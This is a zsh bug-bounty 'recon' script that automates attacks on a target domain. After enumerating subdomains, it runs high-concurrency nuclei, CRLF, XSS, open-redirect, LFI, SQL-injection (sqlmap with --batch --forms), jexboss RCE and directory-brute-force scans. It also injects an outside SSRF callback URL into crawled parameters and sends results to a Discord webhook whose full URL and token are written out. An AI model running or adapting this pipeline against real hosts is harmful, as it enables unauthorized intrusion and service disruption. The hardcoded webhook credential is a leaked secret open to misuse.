#!/bin/zsh

#TARGET=$1
#DIR=$2

echo -e "\e[31m
█▀▀ █░░ █▀ █▀▀ ▄▀█ ▀▀█ ▄▄ ▄█ ▄█ █▀█
██▄ █▄▄ ▄█ █▀░ █▀█ ░░█ ░░ ░█ ░█ █▄█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

[ -z "$1" ] && { printf "\n [+]Please Use recon example.com[+]\n";exit;}

#------------------------------------------------#
echo -e "Start Subfinder \n"
#------------------------------------------------#
subfinder -d $1 -t 1000 -o subfinder.txt
#------------------------------------------------#
echo -e "Start Findomain \n"
#------------------------------------------------#
findomain --quiet -t $1 -u findomain.txt
#------------------------------------------------#
crobat -s $1 $DEBUG_ERROR | anew -q crobat.txt
#------------------------------------------------#
echo -e "Start Sort \n"
#------------------------------------------------#
cat trailso.txt subfinder.txt crobat.txt findomain.txt|sort -u|tee Final-subs.txt
#------------------------------------------------#
echo -e "Start Httpx \n"
#------------------------------------------------#
cat Final-subs.txt|httpx -threads 1000 -o $1-alive-subs.txt
#------------------------------------------------#
echo -e "[+]Finish All Subdomain Enum for $1 target *$(wc -l "Final-subs.txt")* for None-Alive Subdomains and *$(wc -l "$1-alive-subs.txt")* for alive subdomains  "|notify -discord -discord-webhook-url "https://discord.com/api/webhooks/806494192409903134/ac9LWdRIHGDYFdoWeha_c66KHjipQrb1o7nz-du7aHXBwLx3EBx2aFZLCinhz3LWzjuy"
#------------------------------------------------#
echo -e "[+] Start CRLFUZZ [+]"
#------------------------------------------------#
crlfuzz -l $1-alive-subs.txt -s -c 1000 |tee crlfuzz.txt
#------------------------------------------------#
echo -e "[+] Finish CRLFUZZ And Found *$(wc -l < crlfuzz.txt)*"
#------------------------------------------------#
echo -e "[+] Start nuclei [+]"
#------------------------------------------------#
nuclei -update-templates
nuclei -l $1-alive-subs.txt -t /root/nuclei-templates -c 700 -rate-limit 1000 -severity critical,high,medium,low -etags network
#------------------------------------------------#
httpx -l $1-alive-subs.txt -path /sm/login/loginpagecontentgrabber.do -threads 500 -random-agent -x GET,POST,PUT -title -tech-detect -status-code  -follow-redirects -title -mc 500
#------------------------------------------------#
echo -e "[+] Start FullXSS [+]"

echo -e "\e[31m
▀▄▀ █▀ █▀
█░█ ▄█ ▄█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

bash fullxss.sh $1-alive-subs.txt

gospider -S $1 -t 200 -c 700 | tr " " "\n" | grep --color=auto -v ".js" | grep --color=auto "https://" | grep --color=auto "=" | qsreplace http://ssrftest.com/x/IqkgW

echo -e "\e[31m
█▀█ █▀█ █▀▀ █▄░█
█▄█ █▀▀ ██▄ █░▀█
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

echo -e "[+] Start FullRED [+]"

bash fullopen.sh $1-alive-subs.txt

echo -e "[+] Start RCE/FullLFI/SQLI/SSTI/SENSITIVE [+]"
#------------------------------------------------#
python3 jexboss/jexboss.py -mode file-scan -file $1-alive-subs.txt -out report_file_scan.log
#------------------------------------------------#
bash lfi.sh $1-alive-subs.txt
bash sqli.sh $1-alive-subs.txt
sqlmap -m $1-alive-subs.txt --batch --random-agent --level 1 --crawl=5 --forms --threads=5
python3 dirsearch/dirsearch.py -l $1-alive-subs.txt

echo -e "\e[31m
█▀▄ █▀█ █▄░█ █▀▀
█▄▀ █▄█ █░▀█ ██▄
coded by @ELSFA7-110@automotion bughunting@\n\e[0m"

echo -e "[+]Finish RECON for $1 "|notify -discord -discord-webhook-url "https://discord.com/api/webhooks/806494192409903134/ac9LWdRIHGDYFdoWeha_c66KHjipQrb1o7nz-du7aHXBwLx3EBx2aFZLCinhz3LWzjuy"
#------------------------------------------------#
